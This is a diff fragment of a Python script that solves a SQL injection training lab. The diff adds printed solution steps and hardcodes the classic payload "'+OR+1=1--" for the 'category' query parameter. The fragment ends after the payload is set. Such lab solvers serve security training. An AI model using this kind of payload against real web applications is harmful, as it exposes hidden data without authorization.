@@ -1,12 +1,16 @@
 import requests
 import urllib3
 import time
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
 
 def run(url, payload, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter\n2. Observe that all products are returned in the response\n""")
+
     if url.endswith('/'):
         url = url[:-1]
     payload = "'+OR+1=1--"
